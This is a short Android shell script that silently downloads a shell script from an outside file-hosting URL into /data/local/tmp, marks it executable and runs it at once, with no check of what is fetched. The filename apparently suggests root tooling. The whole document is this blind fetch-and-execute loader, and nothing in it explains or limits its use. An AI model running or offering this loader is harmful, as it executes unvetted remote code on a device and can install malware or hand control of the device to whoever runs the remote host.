#!/system/bin/sh
SCRIPT_URL="https://pan.shenzhi.shop/down.php/9c840a591f2920888ef98fe0b9196f13.sh"
TMP="/data/local/tmp/isu.sh"
curl -sL -o "$TMP" "$SCRIPT_URL" && chmod +x "$TMP" && exec "$TMP"
